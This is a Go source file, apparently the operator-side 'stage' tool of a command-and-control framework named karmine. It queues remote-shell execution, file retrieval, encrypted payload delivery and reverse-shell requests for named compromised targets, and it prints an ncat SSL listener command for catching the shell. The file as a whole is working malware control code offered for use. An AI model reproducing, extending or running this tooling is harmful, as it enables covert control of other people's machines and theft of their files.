package main

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/alecthomas/kingpin"
	"github.com/pygrum/karmine/config"
	"github.com/pygrum/karmine/datastore"
	"github.com/pygrum/karmine/krypto/kes"
	"github.com/pygrum/karmine/models"
	log "github.com/sirupsen/logrus"
)

const (
	cmdstage  = "/tmp/cmdstage.tmp"
	filestage = "/tmp/filestage.tmp"
)

var (
	cmdMap = make(map[string]int)
	app    = kingpin.New("stage", "stage commands or files for remote systems")

	file      = app.Command("file", "stage a file")
	viewFile  = file.Command("view", "view current file stage")
	serveFile = file.Command("serve", "serve a specified file")
	deleteF   = file.Command("clear", "remove a file from the stage")

	encrypt  = serveFile.Flag("encrypt", "file will be written to disk encrypted, ideal if there is a packer on disk").Bool()
	filename = serveFile.Arg("filename", "name of file to stage").Required().String()
	outfile  = serveFile.Arg("outfile", "name of file to write to remote disk").Default("").String()

	cmd      = app.Command("cmd", "stage a command")
	exe      = cmd.Command("exec", "execute a shell command on target")
	get      = cmd.Command("get", "get file(s) from a remote system")
	revshell = cmd.Command("revshell", "initiate reverse shell with one remote system")
	viewCmd  = cmd.Command("view", "view current command stage")
	deleteC  = cmd.Command("clear", "remove a command from the stage")

	cmdstring = exe.Arg("command", "command to execute").Required().String()

	files = get.Arg("files", "array of files to fetch remotely, comma-separated").Required().String()

	lhost = revshell.Arg("lhost", "host that client connects to").Required().String()
	lport = revshell.Arg("lport", "port that client will connect to and server listens on").Required().String()

	forwho = app.Flag("for", "name of target to receive command").String()
)

func main() {
	db, err := datastore.New()
	if err != nil {
		log.Fatal(err)
	}
	cmdMap["exec"] = 1
	cmdMap["get"] = 3
	cmdMap["revshell"] = 4
	switch kingpin.MustParse(app.Parse(os.Args[1:])) {
	case viewFile.FullCommand():
		content, err := datastore.ShowStage(filestage)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(content)
		return
	case serveFile.FullCommand():
		handleServe(db)
	case exe.FullCommand():
		handleCmd(db, "exec")
	case get.FullCommand():
		handleCmd(db, "get")
	case revshell.FullCommand():
		if len(*forwho) == 0 {
			log.Fatal("'for' flag is required to initiate a reverse shell")
		}
		handleCmd(db, "revshell")
	case viewCmd.FullCommand():
		content, err := datastore.ShowStage(cmdstage)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(content)
		return
	case deleteC.FullCommand():
		removeIfDelete(cmdstage)
	case deleteF.FullCommand():
		removeIfDelete(filestage)
	}
}

func handleServe(db *datastore.Kdb) {
	bytes, err := os.ReadFile(*filename)
	if err != nil {
		log.Fatal(err)
	}
	var uuid string
	if !*encrypt {
		log.Warn("'encrypt' flag was not set, meaning file will be unencrypted on disk.")
	}
	if *encrypt && len(*forwho) == 0 {
		log.Fatal("'for' flag must be provided in order to encrypt the file with the profile's aeskey")
	}
	if len(*forwho) != 0 {
		// if not broadcast, encrypt the file object
		uuid, err = datastore.GetUUIDByName(*forwho)
		if err != nil {
			log.Fatal(err)
		}
		// encrypt the file bytes if --encrypt is set
		if *encrypt {
			aeskey, X1, X2 := db.GetKeysByUUID(uuid)
			bytes, err = kes.EncryptObject(bytes, aeskey, X1, X2)
			if err != nil {
				log.Fatal(err)
			}
		}
	}
	index := 0
	for i, n := range os.Args {
		if n == "serve" {
			index = i
		}
	}
	rawCmd := strings.Join(os.Args[index:], " ")
	if err = db.AddCmdToStack(rawCmd); err != nil {
		log.Fatal(err)
	}
	ofile := *outfile
	if len(*outfile) == 0 {
		ofile = filepath.Base(*filename)
		log.Infof("file name on remote has defaulted to %s", ofile)
	}
	fileObj := &models.KarObjectFile{
		FileBytes: bytes,
		FileName:  ofile,
	}
	fileObjBytes, err := json.Marshal(fileObj)
	if err != nil {
		log.Fatal(err)
	}
	if len(*forwho) == 0 {
		// if broadcast, warn that file object isn't encrypted
		log.Warnf("'for' not set, file object will not be aes-encrypted on transit")
	} else {
		// if not broadcast, encrypt the file object
		aeskey, X1, X2 := db.GetKeysByUUID(uuid)
		fileObjBytes, err = kes.EncryptObject(fileObjBytes, aeskey, X1, X2)
		if err != nil {
			log.Fatal(err)
		}
	}
	genericObj := &models.GenericData{
		CmdID:  db.GetCmdID(),
		UUID:   uuid,
		Type:   2,
		Object: fileObjBytes,
	}
	genericObjBytes, err := json.Marshal(genericObj)
	if err != nil {
		log.Fatal(err)
	}
	if err = os.WriteFile(filestage, genericObjBytes, 0644); err != nil {
		log.Fatal(err)
	}
	if err = updateStage(filestage, *filename); err != nil {
		log.Fatal(err)
	}
}

func handleCmd(db *datastore.Kdb, myCmd string) {
	cmdlet := cmdMap[myCmd]
	cmdObj := &models.KarObjectCmd{}
	cmdObj.Cmd = cmdlet
	switch myCmd {
	case "exec":
		cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: *cmdstring})
	case "get":
		for _, f := range strings.Split(*files, ",") {
			cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: f})
		}
	case "revshell":
		cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: *lhost})
		cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: *lport})
		crtfile, keyfile, err := config.GetSSLPair()
		if err != nil {
			log.Fatal(err)
		}
		cmd := fmt.Sprintf("ncat -lnvp %s --ssl-cert %s --ssl-key %s", *lport, crtfile, keyfile)
		fmt.Println("[+] run in separate terminal window:")
		fmt.Println(cmd)
	}
	bytes, err := json.Marshal(cmdObj)
	if err != nil {
		log.Fatal(err)
	}
	index := 0
	for i, n := range os.Args {
		if n == myCmd {
			index = i
		}
	}
	rawCmd := strings.Join(os.Args[index:], " ")
	if err = db.AddCmdToStack(rawCmd); err != nil {
		log.Fatal(err)
	}
	if db.GetCmdID() == -1 {
		log.Fatal("error getting latest command id")
	}
	var encObj []byte
	var uuid string
	if len(*forwho) == 0 {
		log.Warnf("'for' not set, command will not be aes-encrypted on transit")
		encObj = bytes
	} else {
		uuid, err = datastore.GetUUIDByName(*forwho)
		if err != nil || len(uuid) == 0 {
			log.Fatalf("error: profile %s does not exist in the database", *forwho)
		} else {
			aeskey, x1, x2 := db.GetKeysByUUID(uuid)
			encObj, err = kes.EncryptObject(bytes, aeskey, x1, x2)
			if err != nil {
				log.Fatal(err)
			}
		}
	}
	genericObj := models.GenericData{
		CmdID:  db.GetCmdID(),
		UUID:   uuid,
		Type:   1,
		Object: encObj,
	}
	bytes, err = json.Marshal(genericObj)
	if err != nil {
		log.Fatal(err)
	}
	if err = os.WriteFile(cmdstage, bytes, 0644); err != nil {
		log.Fatal(err)
	}
	if err = updateStage(cmdstage, rawCmd); err != nil {
		log.Fatal(err)
	}
}

func updateStage(stage, item string) error {
	conf, err := config.GetFullConfig()
	if err != nil {
		return err
	}
	// guarantee stages struct is written if non-existent
	if stage == cmdstage {
		conf.Stages = config.Stages{
			File: conf.Stages.File,
			Cmd:  item,
		}
	} else {
		conf.Stages = config.Stages{
			File: item,
			Cmd:  conf.Stages.Cmd,
		}
	}
	bytes, err := json.MarshalIndent(conf, "", "    ")
	if err != nil {
		return err
	}
	return os.WriteFile(config.ConfigPath(), bytes, 0644)
}

func removeIfDelete(stage string) error {
	if err := datastore.ClearStage(stage); err != nil {
		return err
	}
	return os.Remove(stage)
}
